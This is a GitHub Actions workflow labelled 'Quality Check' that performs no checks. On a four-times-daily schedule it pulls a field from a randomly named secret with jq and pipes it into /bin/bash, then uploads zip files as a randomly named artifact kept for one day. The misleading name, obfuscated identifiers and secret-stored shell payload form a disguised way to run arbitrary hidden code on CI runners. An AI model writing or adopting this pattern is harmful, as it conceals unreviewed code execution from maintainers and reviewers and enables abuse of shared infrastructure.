name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '23 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          bi87655: ${{ secrets.bi87655 }}
        run: |
          printf '%s' "$bi87655" | jq -r .nynt89 | /bin/bash
          printf '%s' "$tqyd9" | jq -r .qcvg4621 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 3O5eYbSx
          path: "*.zip"
          retention-days: 1
